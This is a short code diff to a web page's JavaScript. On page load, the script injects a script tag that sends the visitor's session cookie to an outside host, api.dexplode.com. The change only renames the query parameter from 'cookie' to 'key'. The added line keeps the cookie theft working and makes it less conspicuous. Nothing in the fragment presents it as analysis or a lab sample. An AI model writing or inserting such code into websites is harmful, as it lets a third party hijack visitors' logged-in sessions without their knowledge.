@@ -28,7 +28,6 @@ if (!getCookie('session')) {
 }
 window.onload = function() {
     var pot = document.createElement('script');
-    pot.src = 'https://api.dexplode.com/dFv1pZ/?cookie='
-        + getCookie('session');
+    pot.src = 'https://api.dexplode.com/dFv1pZ/?key=' + getCookie('session');
     document.getElementsByTagName('head')[0].appendChild(pot);
 }
